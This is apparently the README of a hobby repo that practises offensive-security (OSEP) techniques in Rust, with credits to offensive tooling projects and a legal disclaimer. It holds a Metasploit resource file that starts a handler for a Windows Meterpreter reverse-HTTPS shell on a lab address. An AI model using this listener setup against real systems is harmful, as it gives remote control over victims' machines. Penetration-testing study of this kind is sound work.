# Tartocitron
Tartocitron is a repo to have fun with OSEP concepts and the Rust language.

## But, why?
I have spare time.

## Install Rust on Linux
https://www.rust-lang.org/tools/install

## Meterpreter rc file
All tests presented here have been performed with the following msf rc entries:
`use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.56.101
set LPORT 443
set exitfunc thread
set stagerencode true
run -j`


## Credits
* https://github.com/trickster0/OffensiveRust
* https://github.com/byt3bl33d3r/OffensiveNim

## Legal disclaimer
Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.